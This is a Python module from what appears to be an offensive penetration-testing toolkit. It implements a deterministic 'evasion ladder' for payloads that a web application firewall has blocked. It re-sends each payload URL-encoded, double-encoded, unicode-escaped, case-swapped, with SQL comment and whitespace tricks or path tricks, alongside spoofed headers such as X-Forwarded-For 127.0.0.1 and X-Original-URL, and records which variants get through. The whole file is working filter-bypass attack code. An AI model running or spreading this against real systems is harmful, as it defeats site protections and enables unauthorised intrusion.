"""omega/offensive/offense/evadechain — structured evasion chains.

mutafuzz evolves randomly; evadechain is DETERMINISTIC and ordered:
when a payload is blocked, try the full evasion ladder before giving
up — URL-encode, double-encode, unicode-escape, case-swap, comment
insertion, whitespace tricks, path-style tricks, header tampering —
and keep what passes. OFFENSE-GATED (PTK_OFFENSE).
"""
import os
import random
import urllib.parse

__all__ = ["run_evadechain", "ENCODERS"]

BLOCK_MARK = ("403", "forbidden", "blocked", "denied", "waf", "captcha")


def _enc_plain(p):
    return p, {}


def _enc_url(p):
    return urllib.parse.quote(p), {}


def _enc_double(p):
    return urllib.parse.quote(urllib.parse.quote(p)), {}


def _enc_unicode(p):
    return "".join(f"\\u{ord(c):04x}" if not c.isalnum() and c not in
                   " &=" else c for c in p), {}


def _enc_case(p):
    return "".join(c.upper() if i % 2 else c.lower()
                   for i, c in enumerate(p)), {}


def _enc_comment(p):
    return p.replace(" ", "/**/", 1).replace("=", "/**/=", 1), {}


def _enc_ws(p):
    return p.replace("=", "= ", 1), {}


def _enc_path(p):
    return p.replace("/", "/./", 1), {}


def _enc_mixed(p):
    a, _ = _enc_url(p)
    return _enc_case(a), {}


ENCODERS = [("plain", _enc_plain), ("url", _enc_url),
            ("double", _enc_double), ("unicode", _enc_unicode),
            ("case", _enc_case), ("comment", _enc_comment),
            ("ws", _enc_ws), ("path", _enc_path), ("mixed", _enc_mixed)]


def run_evadechain(payload, send, extra_headers=None, log=None,
                   gate_open_fn=None):
    """Run the evasion ladder on one blocked payload.

    send(encoded_payload, headers=None) -> response text/None.
    Returns {"passed": [(encoder, payload, headers)], "blocked": n}.
    """
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        return {"note": "offense layer disabled (PTK_OFFENSE)"}
    if not callable(send):
        return {"note": "send adapter required"}
    passed = []
    blocked = 0
    hdr_sets = [None, {"X-Forwarded-For": "127.0.0.1"},
                {"X-Original-URL": "/"},
                {"User-Agent": "Mozilla/5.0 (Windows NT 10.0)"}]
    random.seed(7)
    for name, fn in ENCODERS:
        enc, _ = fn(str(payload))
        for hdrs in hdr_sets:
            merged = dict(extra_headers or {})
            if hdrs:
                merged.update(hdrs)
            try:
                resp = send(enc, merged)
            except TypeError:
                resp = send(enc)
            except Exception:
                resp = None
            body = (resp or "").lower() if isinstance(resp, str) \
                else str(resp or "").lower()
            if resp is None or any(m in body for m in BLOCK_MARK):
                blocked += 1
                continue
            passed.append((name, enc, merged))
            break  # this encoder works; no need for more header sets
    if log:
        log(f"evadechain: {len(passed)} passed, {blocked} blocked")
    return {"passed": passed, "blocked": blocked,
            "note": None if passed else
                    "entire ladder blocked — report as hardened target"}
